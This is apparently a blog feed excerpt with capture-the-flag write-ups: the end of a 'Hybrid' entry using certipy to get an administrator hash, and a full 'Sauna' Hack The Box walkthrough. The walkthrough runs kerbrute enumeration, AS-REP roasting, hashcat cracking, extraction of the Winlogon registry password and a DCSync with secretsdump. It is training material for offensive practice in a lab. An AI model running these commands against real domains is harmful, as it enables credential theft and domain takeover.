$ proxychains4 -q certipy auth -pfx administrator.pfx -domain hybrid.vl -dc-ip 10.10.149.117 -debugCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: administrator@hybrid.vl[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;administrator.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;administrator&#x27;[*] Got hash for &#x27;administrator@hybrid.vl&#x27;: &lt;SNIP&gt;


]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>ADCS</tag>
        <tag>NFS</tag>
        <tag>Roundcube Webmail</tag>
      </tags>
  </entry>
  <entry>
    <title>Sauna (Windows Easy)</title>
    <url>/2025/05/10/Sauna/</url>
    <content><![CDATA[
This box start off with port 80 open. Enumeration of the website returns users upon a page. Kerberoasting proves successful as you retrieve the hash of user fsmith. Once the hash is cracked we are able to gain access to the machine. Doing the steps to escalate privilege we come across cached credentials used by WinLogon found in Registry for user svc_loanmanager, we get the credentials using PowerShell. After looking at the user in Bloodhound, we find the user has GetChangesAll to the domain. This allows the user to DCSync and dump all the hashes for the domain.
Initial NmapPORT     STATE SERVICE       REASON          VERSION                                   53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus                           80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0                  |_http-title: Egotistical Bank :: Home                                                | http-methods:                                                                       |   Supported Methods: OPTIONS TRACE GET HEAD POST                                     |_  Potentially risky methods: TRACE                                                  |_http-server-header: Microsoft-IIS/10.0                                              88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-10 21:23:01Z)135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                     139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn             389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds? syn-ack ttl 127                                          464/tcp  open  kpasswd5?     syn-ack ttl 127                                          593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0       636/tcp  open  tcpwrapped    syn-ack ttl 127                                          3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)3269/tcp open  tcpwrapped    syn-ack ttl 127                                          Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
From the looks of the scan, we dealing with Active Directory. 😍😎
Port 80 is open as well, maybe ADCS. Lets see.
HTTP - EgotisticalBanking…funnySo we look through the website and much of it is ending in .html, so not very useful. Yet there is a about us section, which has some people on it and their names. We can gather these and try them.
$ curl -s http://10.10.10.175/about.html | html2text | grep -i Fergus -A5 &gt; users.lst
Now we need to spice it up a bit, we can create a list of potential usernames with username-anarchy.
$ username-anarchy -i users.lst &gt; users.list

Kerberoasting the lot of ‘emWe can see if any usernames are valid.
$ kerbrute userenum -d egotistical-bank.local --dc 10.10.10.175 users.list&lt;SNIP&gt;2025/05/10 12:05:48 &gt;  Using KDC(s):2025/05/10 12:05:48 &gt;   10.10.10.175:882025/05/10 12:05:48 &gt;  [+] VALID USERNAME:       fsmith@egotistical-bank.local
Lets see if fsmith has Do not require Kerberos preauthentication set, might get an easy win.
$ GetNPUsers.py -dc-ip 10.10.10.175 &#x27;egotistical-bank.local/fsmith&#x27; -outputfile ./fsmith.hashName    MemberOfPasswordLastSet             LastLogon                   UAC      ------  ------------------------------------------------------------------  --------------------------  --------------------------  --------FSmith  CN=Remote Management Users,CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL  2020-01-23 10:45:19.047096  2025-05-10 19:10:08.254342  0x410200 $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:&lt;SNIP&gt;

This does get us user fsmith‘s hash. We can crack it with hashcat and get a cleartext password (-m 18200). After that we run a bloodhound dump and see what privileges our user has on the box. 
--HashCat--$ hashcat -a 0 -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt--BloodHound--$ nxc ldap egotistical-bank.local -u fsmith -p &lt;SNIP&gt; --bloodhound -c All --dns-server 10.10.10.175
BloodHound the big Angry DogLooking at our user fsmith, we don’t have anything useful to escalate our privilege, but we are apart of the Remote Management Users group. That being a start we can make our way onto the box.
We’ll come back when we have more!!

Evil things are happeningOnce on the box, we do some basic enumeration (i.e. net tools, uncommon installed programs, checking registry, and services). We happen to find a AutoLogon assigned to user svc_loanmanager.
*Evil-WinRM* PS C:\Users\FSmith\Documents&gt; Get-ItemProperty -Path &#x27;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\&#x27; -Name &quot;DefaultUserName&quot;DefaultUserName : EGOTISTICALBANK\svc_loanmanagerPSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersionPSChildName     : WinlogonPSDrive         : HKLMPSProvider      : Microsoft.PowerShell.Core\Registry
We can actually obtain the password using the same command just specify DefaultPassword for the Name parameter.
Evil-WinRM* PS C:\Users\Administrator\Documents&gt; Get-ItemProperty -Path &#x27;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\&#x27; -Name &quot;DefaultPassword&quot;DefaultPassword : &lt;SNIP&gt;PSPath          : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\PSParentPath    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersionPSChildName     : WinlogonPSDrive         : HKLMPSProvider      : Microsoft.PowerShell.Core\Registry

Back to the Future at least to BloodHoundLooking for this user in bloodhound, we don’t find svc_loanmanager, yet we do see svc_loanmgr. We see his privileges are much more dangerous. He has GetChangesAll allowing for our user to DCSync with the domain and dump hashes.

Dumping everythingFinally, with secretsdump we collect the Administrator hash.
secretsdump.py -dc-ip 10.10.10.175 &#x27;egotistical-bank.local/svc_loanmgr@egotistical-bank.local&#x27;&lt;SNIP&gt;[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                 [*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;:::EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:&lt;SNIP&gt;:::&lt;SNIP&gt;


]]></content>
      <categories>
        <category>htb</category>
      </categories>
      <tags>
        <tag>Registry</tag>
        <tag>ASREPRoasting</tag>
        <tag>Web Applications</tag>
        <tag>PowerShell</tag>
      </tags>
  </entry>
</search>
